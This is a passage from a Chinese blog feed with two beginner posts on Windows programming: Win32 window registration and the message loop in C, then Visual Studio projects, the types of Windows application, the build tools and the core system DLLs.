class="line">wc.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">wc.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">8</span>);</span><br><span class="line">wc.hCursor = <span class="literal">NULL</span>;</span><br><span class="line">wc.hIcon = <span class="literal">NULL</span>;</span><br><span class="line">wc.hInstance = hIns;</span><br><span class="line">wc.lpfnWndProc = WndProce; <span class="comment">// 最重要</span></span><br><span class="line">wc.lpszClassName = <span class="string">&quot;Main&quot;</span>;</span><br><span class="line">wc.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">wc.style = CS_HREDRAW | CS_VREDRAW; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用一个系统调用函数,将这个结构体直接写入到操作系统的内核中去</span></span><br><span class="line">RegisterClass(&amp;wc); <span class="comment">//将以上所有赋值全部写入操作系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在内存中创建窗口(申请一块内存,将窗口的各种数据存储进去)</span></span><br><span class="line">HWND hWnd = CreateWindow(<span class="string">&quot;Main&quot;</span>, <span class="string">&quot;window&quot;</span>, WS_OVERLAPPEDWINDOW, <span class="number">500</span>, <span class="number">100</span>, <span class="number">500</span>, <span class="number">500</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hIns, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示窗口,按照窗口的数据在屏幕上显示窗口</span></span><br><span class="line"><span class="comment">// 借助一个Windows api</span></span><br><span class="line">ShowWindow(hWnd, SW_SHOW);</span><br><span class="line">UpdateWindow(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消息循环</span></span><br><span class="line">MSG nMsg = &#123; <span class="number">0</span> &#125;; <span class="comment">// MSG这个结构体就是保存GetMessage抓出来的消息</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// nMsg保存Getmessage抓取过来的参数</span></span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;nMsg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;nMsg); <span class="comment">// 翻译消息</span></span><br><span class="line">DispatchMessage(&amp;nMsg);<span class="comment">// 将消息交给窗口处理函数来处理,也就是我们自己定义的消息来处理。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>最后一步就是消息处理了（最后一步这里不多说），就举个例子比如你对窗口的某个按钮做了点击操作，此时自定义的函数就要做相关的一些操作。或者是点击关闭按钮，表示程序退出，这时需要调用一个窗口退出函数来退出，否则该程序就算你关了窗口，程序也会在后台一直运行。</li><li>最终的效果如下：</li></ul><p><img src="/2025/09/18/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B2-%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/image-20250918111643146.png" alt="image-20250918111643146"></p><h2 id="注册窗口类">注册窗口类</h2><ul><li>窗口类：是一个数据结构，通过结构体定义，包含了窗口的各种参数信息。<ul><li>每个窗口都具有窗口类，基于窗口类创建窗口。</li><li>每个窗口类都具有一个名称，使用前必须注册到系统。</li></ul></li><li>窗口类有三种分别是：<ul><li>系统窗口类：系统已经定义（注册）好的窗口类，<strong>所以应用程序都可以直接使用</strong>。</li><li>应用程序全局窗口类：由用户自己定义，<strong>当前应用程序所有模块都可以使用</strong>。</li><li>应用程序局部窗口类：由用户自己定义，<strong>当前应用程序中本模块可以使用</strong>。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagWNDCLASSW</span> &#123;</span></span><br><span class="line">    UINT        style;</span><br><span class="line">    WNDPROC     lpfnWndProc;</span><br><span class="line">    <span class="type">int</span>         cbClsExtra;</span><br><span class="line">    <span class="type">int</span>         cbWndExtra;</span><br><span class="line">    HINSTANCE   hInstance;</span><br><span class="line">    HICON       hIcon;</span><br><span class="line">    HCURSOR     hCursor;</span><br><span class="line">    HBRUSH      hbrBackground;</span><br><span class="line">    LPCWSTR     lpszMenuName;</span><br><span class="line">    LPCWSTR     lpszClassName;</span><br><span class="line">&#125; WNDCLASSW, *PWNDCLASSW, NEAR *NPWNDCLASSW, FAR *LPWNDCLASSW;</span><br></pre></td></tr></table></figure><h3 id="系统窗口类">系统窗口类</h3><ul><li>不需要用户注册，直接使用窗口类即可。系统已经注册好了。例如：<ul><li>按钮窗口：<code>BUTTON</code></li><li>编辑框：<code>EDIT</code></li></ul></li><li>下面一个代码创建了一个系统窗口类：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：一些crackme和Keygenme都是窗口程序,前来学学</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Windows开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/Windows%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows高级编程1-应用程序的分类和工具</title>
    <link href="http://iyheart.github.io/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/"/>
    <id>http://iyheart.github.io/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/</id>
    <published>2025-09-16T02:08:56.000Z</published>
    <updated>2025-09-17T14:05:22.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介">简介</h1><ul><li>初步学习<code>C</code>语言或者<code>C++</code>语言，再加上一点<code>操作系统</code>的知识就可以初步学习一下<code>Windows高级编程</code>。</li><li>学习Windows高级编程也算是了解一下Windows开发，学到一定程度之后就可以真正能跑去学逆向了。</li></ul><h1 id="visual-studio介绍">Visual Studio介绍</h1><ul><li><code>Visual Studio</code>就是Windows应用程序开发的一个IDE。基本上Windows程序的开发使用该IDE是非常方便的。这个IDE算是比较大的一个IDE。</li></ul><h2 id="解决方案">解决方案</h2><ul><li>接下来介绍一下这个软件最基本的使用过程。我们先看视图中<strong>解决方案资源管理器</strong>，我们点击解决方案资源管理器这边，左边就会弹出解决方法资源管理器。</li><li>对于<strong>解决方案资源管理器</strong>，我们只需要知道它最重要的一个就是，它管理着很多项目。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525215415636.png" alt="image-20250525215415636"></p><h2 id="项目">项目</h2><ul><li>项目可以理解就是我们要做的一个程序，它里面是<strong>头文件、C文件</strong>的一些集合，这里我们先来新建一个项目</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525220111353.png" alt="image-20250525220111353"></p><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525220140511.png" alt="image-20250525220140511"></p><ul><li>此时就会跳转到这个窗口，这边有一个创建新解决方案，选择这个选项和合适的位置，点击创建即可</li><li>如果我们想要自定义这个解决方案的名字我们就可以取消勾选<strong>将解决方案和项目放在同一目录中</strong>（如第二张图片）</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525220247928.png" alt="image-20250525220247928"></p><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525220853528.png" alt="image-20250525220853528"></p><ul><li>创建好一个项目后我们就会发现，解决方案下面存放着我们新建的项目1</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525220450696.png" alt="image-20250525220450696"></p><ul><li>此时我们在该解决方案中再创建一个项目2，发现我们的解决方案中能管理多个项目，之后就是一个头文件</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525220639825.png" alt="image-20250525220639825"></p><ul><li>所以我们画一个简单的图表示一下<strong>解决方案、项目、头文件、源文件的关系</strong></li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525221038689.png" alt="image-20250525221038689"></p><ul><li>此时我们在这个对应文件夹中能看到文件项目中的文件目录。</li></ul><p>、<img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525221149138.png" alt="image-20250525221149138"></p><ul><li>如果是不选择<strong>将解决方案和项目放在同一目录中</strong>，我们的项目文件就会出现如下图所示的一堆文件，已经对应的项目文件夹。是俩个图的对比，其中<strong>这俩个图的上一级目录如上图所示</strong>，在本级目录中的一些文件有所不同。</li><li>相同点就是在于都存在<code>.sln</code>文件，这个文件被称为<strong>解决方案文件</strong>，这个文件主要就是存放着各个项目的信息。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525221608241.png" alt="image-20250525221608241"></p><ul><li>我们要创建一个新的项目，还可以直接在解决方案这边右键创建，如下图所示</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525222050718.png" alt="image-20250525222050718"></p><ul><li>在创建项目中，VS给我们提供了很多项目模版，我们在学习Windows核心编程的时候主要就是创建这四种类型的项目文件。</li><li>其它文件在Windows高级编程不是特别重要，也不是经常使用。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525223431481.png" alt="image-20250525223431481"></p><h2 id="启动项目">启动项目</h2><ul><li>当我们写好一个程序时，我们就可以使用这个按钮编译我们写好的程序，并且会自动运行。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525224312480.png" alt="image-20250525224312480"></p><ul><li>但是当一个解决方案中有多个项目，我们就会发现，在编译好其中一个项目之后，运行程序时运行的是另一个已经编译好的文件。（其实编译的也不是我们这个项目的文件，其实是编译启动项目的文件）</li><li>比如下图，我们编译的是<code>111</code>，但是运行的<code>hello world</code>，这个主要就是与我们的<strong>启动项目</strong>有关，每个解决方案只能有一个启动项目</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525224425121.png" alt="image-20250525224425121"></p><ul><li>我们可以使用如下操作进行启动项目的设置</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525224600788.png" alt="image-20250525224600788"></p><ul><li>设置完后再进行编译运行操作就没啥问题了</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525224754306.png" alt="image-20250525224754306"></p><h1 id="windows应用程序的分类">Windows应用程序的分类</h1><ul><li><code>Windows</code>应用程序一般就分为三大类：<ol><li>控制台程序<strong>Console</strong>：DOS程序，本身没有窗口，通过<strong>Windows DOS</strong>窗口执行。入口函数：main</li><li>窗口程序：拥有自己的窗口，可以与用户交互。入口函数：WinMain</li><li>库程序：存放代码、数据的程序，执行文件可以从中取出代码执行和获取数据。其中库程序又分为<strong>静态库程序</strong>和<strong>动态库程序</strong><ul><li>静态库程序：扩展名Lib，在编译链接程序时，将代码放入到执行文件中。无入口函数</li><li>动态库程序：扩展名dll，在执行文件执行时从中获取代码。入口函数：DllMain</li></ul></li></ol></li></ul><h2 id="控制台程序">控制台程序</h2><ul><li>我们先来创建一个控制台程序</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525223601596.png" alt="image-20250525223601596"></p><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525223618138.png" alt="image-20250525223618138"></p><ul><li>创建好后这个解决方案就会出现一个这个控制台程序的项目。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525223705240.png" alt="image-20250525223705240"></p><ul><li>接下来就是给这个项目添加一些文件，点击项目这边，然后添加，新建项。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525223922240.png" alt="image-20250525223922240"></p><ul><li>操作完上面的此时就会弹出这个窗口，这样就可以选择我们要添加的文件了。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525224003654.png" alt="image-20250525224003654"></p><ul><li>我们运行时在终端输出一些信息等，这种程序其实就是控制台程序</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525224856718.png" alt="image-20250525224856718"></p><ul><li>当我们编译好后的程序，这里的项目文件就会生成这些文件夹</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525225054348.png" alt="image-20250525225054348"></p><h2 id="窗口程序">窗口程序</h2><ul><li>窗口程序是Windows操作系统的一个比较重要的地方，windows区别于Linux就是图形化界面。所以这个是比较核心的一个点。</li><li>我们先来创建一个基于窗口程序的项目。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525225250487.png" alt="image-20250525225250487"></p><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525225408301.png" alt="image-20250525225408301"></p><ul><li>创建好这个项目后我们先来查看一下这个项目的一些相关文件。我们能看到创建完后我们的头文件和源文件一开始就会保护这些文件。</li><li>这里我们要注意一下，我们的控制台程序的主函数是叫<strong>main</strong>函数，而我们的这个应用窗口程序的主函数叫<strong>WinMain</strong>这个函数。这些代码看不懂，没啥关系，之后会慢慢学。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525225517489.png" alt="image-20250525225517489"></p><ul><li>接下来我们选择这个项目为启动项目，编译运行一下这个项目，运行之后我们就会得到如下的窗口。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250525225733861.png" alt="image-20250525225733861"></p><h2 id="静态库程序">静态库程序</h2><ul><li>不论是静态库程序还是动态库程序，在原理上都是和Linux相同的。只不过在实现上有不同就是了。</li><li>接下来我们就先来添加一个静态库</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526005329605.png" alt="image-20250526005329605"></p><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526005337520.png" alt="image-20250526005337520"></p><ul><li>新建完之后我们会发现我们新建的这个项目有如下这些文件</li><li>我们会看到这里我们并没有主函数，说明静态库程序并没有主函数。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526005429329.png" alt="image-20250526005429329"></p><ul><li>我们编译运行这个程序后会发现该程序会弹出一个报错框，但是这个静态库会被编译好，编译成<code>.lib</code>后缀的文件。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526005632048.png" alt="image-20250526005632048"></p><h2 id="动态库程序">动态库程序</h2><ul><li>接下来我们查看动态库程序，我们就直接新建一个动态链接库的项目</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526005809948.png" alt="image-20250526005809948"></p><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526005834764.png" alt="image-20250526005834764"></p><ul><li>创建好后会看到如下代码，查看代码我们会发现一个<code>DllMain</code>这个函数名，这个就是我们这个<code>dll</code>文件的主函数，也就是入口函数。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526005922754.png" alt="image-20250526005922754"></p><ul><li>这个时候我们编译运行一下，发现还是弹出一个错误的框</li><li>我们发现这个程序已经被编译成了<code>.dll</code>文件，但是我们还是无法运行这个程序</li><li>这就是动态库的一个比较关键的一个地方，它可以运行，但是它不能独立运行，它是依赖其他程序运行的。这个</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526010059287.png" alt="image-20250526010059287"></p><h1 id="开发工具">开发工具</h1><h2 id="编译-链接工具">编译、链接工具</h2><ul><li><strong>VS</strong>这个开发工具会像这样，我们点击按钮，它就会自动将我们的程序编译和链接好。链接的具体过程并没有向我们展示。</li><li>这里就简单介绍一下<strong>VS</strong>编译和链接使用的相关工具。</li><li>编译器这边使用的是<code>CL.exe</code>文件，主要将源代码编译成目标代码<code>.obj</code>文件</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526011417136.png" alt="image-20250526011417136"></p><ul><li>还有链接器<code>LINK.exe</code>，将目标代码、库链接生成最终文件</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526011536220.png" alt="image-20250526011536220"></p><ul><li>还有一个就是资源编译器<code>RC.exe</code>，将<code>.rc</code>资源编译，最终通过链接器存入最终文件。</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526011644125.png" alt="image-20250526011644125"></p><h2 id="库文件-头文件">库文件、头文件</h2><ul><li>对于我们一开始学C语言，最经常使用的就是<code>stdio.h</code>这个库文件。而现在我们学习的是<code>windows</code>高级编程，是开发Windows上的一些应用程序。所以我们使用的库就是windows中特有的库。</li><li>windows高级编程中，以下几个Windows库是最经常使用的。<ul><li><code>kernel32.dll</code>提供了核心的API，例如进程、线程、内存管理</li><li><code>user32.dll</code>提供了窗口、消息等API</li><li><code>gdi32.dll</code>绘图相关的API</li><li>它们的路径都在<code>C:\Windows\System32</code>这里</li></ul></li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526012333575.png" alt="image-20250526012333575"></p><p><img 